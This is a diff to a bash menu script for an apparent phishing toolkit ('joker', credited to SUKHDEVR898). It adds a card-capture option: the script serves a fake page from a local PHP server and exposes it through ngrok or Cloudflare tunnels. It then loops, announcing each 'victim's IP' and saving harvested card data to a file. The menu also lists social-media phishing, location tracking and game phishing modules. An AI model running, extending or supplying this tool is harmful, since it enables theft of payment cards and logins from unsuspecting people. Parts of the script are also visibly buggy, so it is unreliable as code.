@@ -1,6 +1,117 @@
 clear
 ##############################
+flare(){
+echo -e "\e[96m        |=====================================================|"
+echo -e "\e[96m        |                      CLOUDFLARED SERVER             |"
+echo -e "\e[96m        |         copy this command =>(  bash flare.sh   )    |"
+echo -e "\e[96m        |     OPEN NEW SESSION AND RUN ABOVE COMMAND          |"
+echo -e "\e[96m        |=====================================================|"
 
+}
+local(){
+php -S localhost:8080 > /dev/null 2>1&
+echo -e "\e[96m        |=====================================================|"
+echo -e "\e[96m        |      [\e[92m1\e[96m]==> NGROK                       |"
+echo -e "\e[96m        |      [\e[92m2\e[96m]==> CLOUDFLARE                  |"
+echo -e "\e[96m        |=====================================================|"
+read -p "CHOOSE SERVER : " flare
+if [ $flare == 1 ];
+then 
+ngrok
+
+elif [ $flare == 2 ];
+then 
+flare
+fi
+}
+
+link(){
+if [ -e link.txt ];
+then
+rm link.txt
+fi
+curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io" > link.txt
+
+
+
+}
+ngrok(){
+cd $HOME
+echo -e "\e[91m \t\t PLEASE ON MOBILE HOTSPOT "
+sleep 5.0
+echo -e "\e[92m\n\t\t LOCALHOST STARTING... "
+sleep 2.0
+echo -e "\e[92m \n\t\t NGROK STARTING... "
+
+./ngrok http 8080 > /dev/null 2>1&
+sleep 5.0
+cd joker/.sites/$url
+link
+
+echo -e "\e[96m \n \tLOCALHOST : "
+echo -e "\e[94m                 ┃"
+echo -e "\e[94m                 ┃"
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+echo -e "\e[94m┃  \t\t127.0.0.1:8080                   "
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+echo -e "\e[96m \n \tNGROK LINK : "
+echo -e "\e[94m                 ┃"
+echo -e "\e[94m                 ┃"
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+echo -e " $(cat link.txt)"
+
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+}
+ip(){
+
+if [ -e ip.txt ];
+then 
+mpv $HOME/joker/cap.mp3 > /dev/null 2>1&
+
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+echo -e "\n"
+echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
+echo -e "\e[94m\n┃-------  (SAVE IN IP.TXT)  -------┃"
+rm ip.txt
+echo -e "\n"
+fi
+}
+
+
+
+
+speed(){
+clear
+
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+echo -e "\e[94m┃           SUKHDEVR898                  "
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+curl https://ipinfo.io/ip > Ip.txt 2> /dev/null
+
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+echo -e "\e[94m YOUR IP ADDRESS : $(cat Ip.txt)                  "
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+rm Ip.txt
+
+
+
+echo -e "\e[94m\n\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+             speedtest
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+echo -e "\e[94m             ━━━━━━DONE━━━━━━━ "
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+}
 
 
 ############################
@@ -47,23 +158,24 @@ choose(){
 
 echo -e "                       \e[92m TOOL BY (SUKHDEVR898)\e[0m"
 echo
-echo -e "\e[96m        |-----------------------[V 2.0]-----------------------|                                    |"
-echo -e "\e[96m        |-------------------\e[92mSELECT OPTIONS\e[96m--------------------|                                    |"
-echo -e "\e[96m        |-----------------------------------------------------|                                    |"
-echo -e "\e[96m        |                                                     |                                    |"
-echo -e "\e[96m        |                                                     |                                    |"
-echo -e "\e[96m        |                [\e[92m1\e[96m]==> SOCIAL MEDIA [✓]              |                                    |"
-echo -e "\e[96m        |                [\e[92m2\e[96m]==> LOCTAION TRACKER [✓]          |                                    |"
-echo -e "\e[96m        |                [\e[92m3\e[96m]==> GAME PSHISH                   |                                    |"
-echo -e "\e[96m        |                [\e[92m4\e[96m]==> ABOUT                         |                                    |"
-echo -e "\e[96m        |                [\e[92m5\e[96m]==> UPDATE                        |                                    |"
-echo -e "\e[96m        |                [\e[92m6\e[96m]==> EXIT                          |                                    |"
-echo -e "\e[96m        |                [\e[92m7\e[96m]==> CHECK SPEED                   |                                    |"
-echo -e "\e[96m        |                [\e[93m00\e[98m]==> DEBUGGING MODE                |                                    |"
-echo -e "\e[96m        |                                                     |                                                |"
-echo -e "\e[96m        |-----------------------------------------------------|                                    |"
-echo -e "\e[96m        |---------------------\e[91mHACK3R\e[96m----------------------|                                    |"
-echo -e "\e[96m        |-----------------------------------------------------|                                    |"
+echo -e "\e[96m        |-----------------------[V 2.0]-----------------------------------|     |"
+echo -e "\e[96m        |-------------------\e[92mSELECT OPTIONS\e[96m--------------------|     |"
+echo -e "\e[96m        |-----------------------------------------------------------------|     |"
+echo -e "\e[96m        |                                                                 |     |"
+echo -e "\e[96m        |                                                                 |     |"
+echo -e "\e[96m        |                [\e[92m1\e[96m]==> SOCIAL MEDIA [✓]              |     |"
+echo -e "\e[96m        |                [\e[92m2\e[96m]==> LOCTAION TRACKER [✓]          |     |"
+echo -e "\e[96m        |                [\e[92m3\e[96m]==> GAME PSHISH                   |     |"
+echo -e "\e[96m        |                [\e[92m4\e[96m]==> CARD CAPUTE                   |     |"
+echo -e "\e[96m        |                [\e[92m5\e[96m]==> ABOUT                         |     |"
+echo -e "\e[96m        |                [\e[92m6\e[96m]==> UPDATE                        |     |"
+echo -e "\e[96m        |                [\e[92m7\e[96m]==> EXIT                          |     |"
+echo -e "\e[96m        |                [\e[92m8\e[96m]==> CHECK SPEED                   |     |"
+echo -e "\e[96m        |                [\e[93m00\e[98m]==> DEBUGGING MODE               |     |"
+echo -e "\e[96m        |                                                                 |     |"
+echo -e "\e[96m        |-----------------------------------------------------------------|     |"
+echo -e "\e[96m        |---------------------\e[91mHACK3R\e[96m--------------------------|     |"
+echo -e "\e[96m        |-----------------------------------------------------------------|     |"
 
 
 }
@@ -84,7 +196,7 @@ bash social.sh
 2)
 bash loc.sh
 ;;
-4)
+5)
 clear
 echo -e "\e[96m \t\t\t|------------------------------------------------------|"       
 echo -e "\e[96m\t\t\t |             SUKHDEVR898                              |"   
@@ -108,7 +220,30 @@ bash joker.sh
 clear
 bash game.sh
 ;;
-5)
+4)
+cd .sites/
+url="card"
+
+cd card
+local 
+while true;
+
+do
+ip
+if [ -e data.txt ];
+then
+echo -e "\e[98m \n  $(cat data.txt)  "
+cat data.txt >> $HOME/joker/www/data.txt
+rm data.txt 
+fi
+
+echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
+echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+fi
+done
+;;
+6)
 echo -e "\e[98m\t\t\t PLEASE WAIT.....!"
 echo -e "\e[98m\t\t\t UPDATE CHECKING.....!"
 sleep 5.0
@@ -146,11 +281,21 @@ bash setup.sh
 bash joker.sh
 esac
 ;;
-6) 
+7) 
 exit 1
 ;;
-7)
-bash spd.sh
+8)
+speed
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+echo -e "\e[94m    DO YOU WANT TO SPEEDTEST AGAIN \n\t\t PRESS ENTER... \n\t\tOTHERWISE TYPE 'n' "
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+read -p " CTRL + C FOR EXIT " spd
+If [ $spd == "n" ];
+then
+bash joker.sh
+else
+speed
+fi
 ;;
 00)
 clear
